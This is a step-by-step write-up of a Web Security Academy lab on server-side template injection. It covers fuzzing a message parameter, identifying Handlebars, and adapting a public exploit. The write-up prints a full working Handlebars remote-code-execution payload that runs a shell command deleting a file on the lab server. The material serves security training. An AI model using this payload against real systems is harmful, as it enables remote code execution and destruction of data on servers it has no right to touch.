Lab: Server-side template injection in an unknown language with a documented exploit

Category: Server-Side Template Injection (SSTI)
Level: Practitioner
Goal: Delete the morale.txt file in Carlos’s home directory.

Step-by-Step Writeup:
Initial Observation
When viewing the first product, you’ll notice a GET request is made with a message parameter. The value of this parameter is rendered
on the homepage as a notification (e.g., "Unfortunately this product is out of stock").

Testing for SSTI
Test this parameter for template injection by sending common SSTI payloads like:

${{<%[%'"}}%\
Submit this fuzz payload using:


https://YOUR-LAB-ID.web-security-academy.net/?message=${{<%[%'"}}%\
Upon submission, observe the output. If an error message appears or is reflected with partial rendering, it indicates the backend is using a template engine vulnerable to SSTI.

Identifying the Template Engine
In this case, the syntax and the nature of the error message suggest the use of Handlebars as the template engine.

Finding a Public Exploit
Perform a web search using:

Handlebars server-side template injection site:portswigger.net OR site:github.com
A known exploit written by @Zombiehelp54 is available and allows remote code execution (RCE) in vulnerable Handlebars environments.

Modifying the Exploit
Modify the exploit to execute a shell command that deletes the target file. The command to run is:

require('child_process').exec('rm /home/carlos/morale.txt');
Final Exploit Payload (Raw)

wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
URL Encoding the Payload
Use URL encoding to insert the full payload as the message parameter. You can use an online URL encoder to convert the payload into a single-line encoded string.

Crafting the Final Exploit URL
Replace YOUR-LAB-ID with your actual lab ID:


https://YOUR-LAB-ID.web-security-academy.net/?message=<ENCODED_PAYLOAD_HERE>
Triggering the Payload
Paste the final URL in your browser and load it. This should execute the payload on the server and delete the target file.

Lab Solved
Once the file /home/carlos/morale.txt is successfully deleted, the lab will be marked as solved.

Recap:

Identify SSTI via fuzzing

Detect Handlebars as the engine

Find known RCE exploit

Modify it to remove morale.txt

Encode and inject via the message parameter

Execute and verify the lab is solved
